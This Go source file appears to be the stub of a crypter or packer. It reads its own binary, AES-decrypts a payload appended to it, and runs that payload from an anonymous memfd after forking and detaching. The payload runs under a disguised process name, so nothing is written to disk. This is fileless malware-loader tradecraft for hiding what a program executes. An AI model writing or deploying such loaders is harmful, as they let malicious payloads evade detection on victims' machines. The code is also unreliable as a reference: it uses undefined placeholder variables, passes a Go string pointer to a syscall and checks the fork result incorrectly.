package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	mfdCloexec     = 0x0001
	memfdCreateX64 = 319
	fork           = 57
)

func runFromMemory(procName string, buffer []byte) {
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
	case 0:
		break
	case 1:
		// Fork failed!
		break
	default:
		// Parent exiting...
		os.Exit(0)
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
	syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	file.Close()

	_ = syscall.Exec(fdPath, []string{procName}, nil)
}

func aesDec(srcBytes, key, iv []byte) []byte {
	block, _ := aes.NewCipher(key)
	decrypter := cipher.NewCFBDecrypter(block, iv)
	decrypted := make([]byte, len(srcBytes))
	decrypter.XORKeyStream(decrypted, srcBytes)
	return decrypted
}

func main() {
	buffer, _ := ioutil.ReadFile(os.Args[0])

	keyBeginIndex := bytes.LastIndex(buffer, []byte(key))
	keyEndIndex := keyBeginIndex + len(key)
	key := buffer[keyBeginIndex:keyEndIndex]

	ivBeginIndex := bytes.LastIndex(buffer, []byte(iv))
	ivEndIndex := ivBeginIndex + len(iv)
	iv := buffer[ivBeginIndex:ivEndIndex]

	target := buffer[ivEndIndex:]
	target = aesDec(target, key, iv)
	runFromMemory(procName, target)
}
